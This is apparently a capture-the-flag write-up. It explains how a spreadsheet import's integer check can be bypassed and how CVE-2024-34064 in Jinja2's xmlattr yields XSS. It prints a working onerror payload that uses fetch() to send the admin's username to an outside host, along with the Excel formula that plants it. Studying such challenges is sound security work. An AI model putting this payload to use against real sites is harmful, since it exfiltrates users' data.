# Writeup

```py
if type(excel.evaluate(f'Sheet1!C{row}')) is not int:
    flash(f"Sheet1!C{row}, Rank must be an integer")
    return redirect(request.url)

excel.evaluate(f'Sheet1!E{row}')
excel.set_value(f'Sheet1!E{row}', "Imported")

name = excel.evaluate(f'Sheet1!A{row}')
time = excel.evaluate(f'Sheet1!B{row}')
rank = excel.evaluate(f'Sheet1!C{row}')
country = excel.evaluate(f'Sheet1!D{row}')
```

Rank is validated but then accessed directly again. As Column E is changed we can make the Cell change depending on this field. So first it's an integer then after "Imported" is written into it it changes to our payload which is then used to build the rank style:

```py
def style(rank):
    return {f"rank-{rank}": "1", "src": f"/static/rank-{rank}.png", "width": "25px", "height": "25px"}
```

This is then used in the Jinja2 template to style the first 3 ranks.

```html
<img {{ style(result.rank)|xmlattr }}  alt="rank-img"/></td>
```

Due to CVE-2024-34064 we can manipulate the style in a way that we get XSS and can extract the Username of the admin from the page.

rank has to be something like: `/onerror=fetch('http://schni.at?u='+document.getElementsByTagName('li')[0].attributes.value.nodeValue)/` which is achieved to make the C2 cell of the example sheet like this: `=IF(ISBLANK(E2);1;"/onerror=fetch('http://schni.at?u='+document.getElementsByTagName('li')[0].attributes.value.nodeValue)/")`.